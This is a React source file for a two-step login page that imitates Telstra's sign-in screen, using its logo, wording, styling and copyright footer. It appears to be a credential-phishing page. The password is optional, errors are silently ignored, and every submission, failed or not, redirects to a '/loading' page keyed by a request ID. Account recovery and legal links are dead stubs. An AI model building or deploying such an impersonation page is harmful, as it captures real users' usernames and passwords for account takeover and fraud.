import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Card, CardContent } from "@/components/ui/card";
import { Loader2, AlertTriangle, ArrowLeft } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocation } from "wouter";

const usernameSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters long"),
  rememberUsername: z.boolean().default(false),
});

const passwordSchema = z.object({
  password: z.string().optional(),
});

type UsernameFormData = z.infer<typeof usernameSchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

export default function Login() {
  const [step, setStep] = useState<'username' | 'password'>('username');
  const [usernameData, setUsernameData] = useState<UsernameFormData | null>(null);
  const [location, setLocation] = useLocation();

  const usernameForm = useForm<UsernameFormData>({
    resolver: zodResolver(usernameSchema),
    defaultValues: {
      username: "",
      rememberUsername: false,
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      password: "",
    },
  });

  const checkUsernameMutation = useMutation({
    mutationFn: async (data: UsernameFormData) => {
      const response = await apiRequest("POST", "/api/auth/check-username", data);
      return response.json();
    },
    onSuccess: (result, variables) => {
      setUsernameData(variables);
      setStep('password');
    },
    onError: () => {
      // Silently handle error - no toast
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (passwordData: PasswordFormData) => {
      const fullLoginData = {
        ...usernameData!,
        ...passwordData,
      };
      const response = await apiRequest("POST", "/api/auth/login", fullLoginData);
      return response.json();
    },
    onSuccess: (result) => {
      // Redirect to loading page with request ID and username
      const requestId = result.requestId || Date.now().toString();
      const username = usernameData?.username || '';
      setLocation(`/loading?requestId=${requestId}&username=${encodeURIComponent(username)}`);
    },
    onError: () => {
      // Still redirect to loading page even on error - backend will handle everything
      const requestId = Date.now().toString();
      const username = usernameData?.username || '';
      setLocation(`/loading?requestId=${requestId}&username=${encodeURIComponent(username)}`);
    },
  });

  const onUsernameSubmit = (data: UsernameFormData) => {
    checkUsernameMutation.mutate(data);
  };

  const onPasswordSubmit = (data: PasswordFormData) => {
    loginMutation.mutate(data);
  };

  const goBackToUsername = () => {
    setStep('username');
    setUsernameData(null);
    passwordForm.reset();
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Telstra Header */}
      <header className="t-page-header">
        <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>
      
      <div role="main" className="t-form-container">
        <h1 className="t-able-heading-b t-able-spacing-2x-mb">
          Sign in
        </h1>
        <div className="t-able-text-bodyshort t-able-spacing-7x-mb">
          Sign in with your Telstra ID
        </div>

        {step === 'username' ? (
          /* Step 1: Username Form */
          <form onSubmit={usernameForm.handleSubmit(onUsernameSubmit)} method="POST" autoComplete="off">
            {/* Username Field */}
            <div className="t-able-text-field t-able-spacing-2x-mb">
              <label htmlFor="username">Username</label>
              <input
                id="username"
                type="text"
                inputMode="email"
                {...usernameForm.register("username")}
                autoComplete="username webauthn"
                aria-invalid="false"
                aria-required="true"
                data-testid="input-username"
              />
              {usernameForm.formState.errors.username && (
                <p 
                  className="text-destructive text-sm"
                  data-testid="text-username-error"
                >
                  {usernameForm.formState.errors.username.message}
                </p>
              )}
            </div>

            {/* Recover Username Link */}
            <div className="t-able-spacing-2x-mb">
              <a
                className="t-able-low-emph-button t-reset-password-link"
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  // Username recovery would be implemented here
                }}
                data-testid="link-recover-username"
              >
                Recover username
              </a>
            </div>

            {/* Remember Username Checkbox */}
            <div className="t-able-checkbox t-able-spacing-3x-mb">
              <input
                name="rememberUsername"
                type="checkbox"
                id="rememberUsername"
                checked={usernameForm.watch("rememberUsername")}
                onChange={(e) => 
                  usernameForm.setValue("rememberUsername", e.target.checked)
                }
                data-testid="checkbox-remember-username"
              />
              <label htmlFor="rememberUsername">
                Remember username
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                  <path d="M9.54,14.81l8-8a1.09,1.09,0,0,1,1.54,0l0,0a1.1,1.1,0,0,1,0,1.54l-8.78,8.78s0,0,0,0a1.12,1.12,0,0,1-.79.33h0a1.15,1.15,0,0,1-.41-.08,1.08,1.08,0,0,1-.39-.25L4.86,13.31a1.13,1.13,0,0,1,.8-1.92,1.11,1.11,0,0,1,.79.33Z"/>
                </svg>
              </label>
            </div>

            {/* Continue Button */}
            <div className="">
              <button
                id="submit_btn"
                className="t-able-high-emph-button t-able-spacing-2x-mb"
                type="submit"
                disabled={checkUsernameMutation.isPending}
                data-testid="button-continue"
              >
                {checkUsernameMutation.isPending ? "Checking..." : "Continue"}
              </button>
            </div>

            {/* OR Divider */}
            <p className="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>

            {/* Create Account Link */}
            <a
              className="t-able-medium-emph-button t-able-spacing-7x-mb"
              href="#"
              onClick={(e) => {
                e.preventDefault();
                // Account creation would be implemented here
              }}
              data-testid="link-create-account"
            >
              Create a Telstra ID
            </a>
          </form>
        ) : (
          /* Step 2: Password Form */
          <form onSubmit={passwordForm.handleSubmit(onPasswordSubmit)} method="POST" autoComplete="off">
            {/* Back to Previous Section */}
            <div className="t-back-to-previous-label t-able-spacing-2x-mb">Back to previous for:</div>
            <a
              className="t-input-with-anchor t-able-spacing-4x-mb"
              href="#"
              onClick={(e) => {
                e.preventDefault();
                goBackToUsername();
              }}
              data-testid="button-back"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="6.98" height="12.45" viewBox="0 0 6.98 12.45" role="img" aria-hidden="true" focusable="false">
                <defs>
                  <clipPath id="a">
                    <path d="M1.82,6.22,6.76,1.28A.75.75,0,1,0,5.7.22L.22,5.69A.77.77,0,0,0,0,6.23a.75.75,0,0,0,.22.53L5.7,12.23a.75.75,0,0,0,.53.22.76.76,0,0,0,.53-.23A.75.75,0,0,0,7,11.69a.77.77,0,0,0-.22-.54Z" fill="none" clipRule="evenodd"></path>
                  </clipPath>
                </defs>
                <g clipPath="url(#a)"><rect x="-5" y="-5" width="16.98" height="22.45" fill="#0064d2"></rect></g>
              </svg>
              <span className="t-able-sr-only">Back to previous for</span>
              <span data-testid="text-selected-username">{usernameData?.username}</span>
            </a>

            {/* Password Field */}
            <div className="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
              <Label htmlFor="password" className="text-sm font-medium text-foreground">
                Password
              </Label>
              <Input
                id="password"
                type="password"
                {...passwordForm.register("password")}
                autoFocus
                autoComplete="current-password"
                aria-invalid="false"
                aria-required="true"
                aria-describedby="password-error-text"
                className="w-full telstra-input"
                data-testid="input-password"
              />
              <button
                type="button"
                id="showPwdBtn"
                className="t-able-low-emph-button t-showpwd"
                aria-label="Show password characters"
                onClick={() => {
                  const passwordInput = document.getElementById('password') as HTMLInputElement;
                  const showBtn = document.getElementById('showPwdBtn');
                  const hideBtn = document.getElementById('hidePwdBtn');
                  if (passwordInput && showBtn && hideBtn) {
                    passwordInput.type = 'text';
                    showBtn.classList.add('t-icon--hidden');
                    hideBtn.classList.remove('t-icon--hidden');
                  }
                }}
                data-testid="button-show-password"
              >
                Show
              </button>
              <button
                type="button"
                id="hidePwdBtn"
                className="t-able-low-emph-button t-showpwd t-icon--hidden"
                aria-label="Hide password characters"
                onClick={() => {
                  const passwordInput = document.getElementById('password') as HTMLInputElement;
                  const showBtn = document.getElementById('showPwdBtn');
                  const hideBtn = document.getElementById('hidePwdBtn');
                  if (passwordInput && showBtn && hideBtn) {
                    passwordInput.type = 'password';
                    hideBtn.classList.add('t-icon--hidden');
                    showBtn.classList.remove('t-icon--hidden');
                  }
                }}
                data-testid="button-hide-password"
              >
                Hide
              </button>
              <p id="password-error-text">
                {passwordForm.formState.errors.password && (
                  <span data-testid="text-password-error">
                    {passwordForm.formState.errors.password.message}
                  </span>
                )}
              </p>
            </div>

            {/* Recover Account Link */}
            <div className="t-able-spacing-2x-mb">
              <a
                className="t-able-low-emph-button t-reset-password-link"
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  // Password reset would be implemented here
                }}
                data-testid="link-recover-account"
              >
                Recover account
              </a>
            </div>

            {/* Sign In Button */}
            <div className="">
              <button
                id="submit_btn"
                className="t-able-high-emph-button t-able-spacing-7x-mb"
                type="submit"
                disabled={loginMutation.isPending}
                data-testid="button-signin"
              >
                {loginMutation.isPending ? "Signing in..." : "Sign in"}
              </button>
            </div>
          </form>
        )}

      </div>

      <footer className="t-footer">
        <div className="t-footer-content">
          <p className="t-footer-copyright">Copyright © 2025 Telstra</p>
          <a 
            className="t-footer-privacy" 
            href="#" 
            target="_blank"
            data-testid="link-privacy"
          >
            Privacy
          </a>
          <a 
            className="t-footer-terms" 
            href="#" 
            target="_blank"
            data-testid="link-terms"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}
